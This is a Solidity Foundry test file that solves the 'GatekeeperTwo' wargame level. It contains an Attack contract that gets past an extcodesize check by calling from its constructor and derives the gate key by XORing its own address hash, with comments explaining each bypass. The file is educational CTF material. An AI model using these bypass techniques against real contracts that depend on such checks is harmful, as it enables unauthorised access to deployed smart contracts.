//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperTwo} from "../src/level15.sol";
import {Test, console} from "forge-std/Test.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        gatekeeperTwo = new GatekeeperTwo();
    }

    function test_attack() public {
        // first gate is passed by using tx.origin
        //second gate is extcodesize it is passes only if the msg.sender contract is not deployed means call the function from the constructor
        // third gate is passed A^B=C is equal to A^C=B,this way we can find the value of B ,here B is gatekey
        Attack attack = new Attack(gatekeeperTwo); // this will deploy the contract and call the constructor it will be used to solve the second gate
    }
}

contract Attack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        //here one thing remember msg.sener is the address of the contract which is calling the function  in the constructor  and after deployment msg.sender is the address of the contract
        bytes8 gateKey = bytes8(
            (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^
                type(uint64).max
        );
        gatekeeperTwo.enter(gateKey);
    }
}
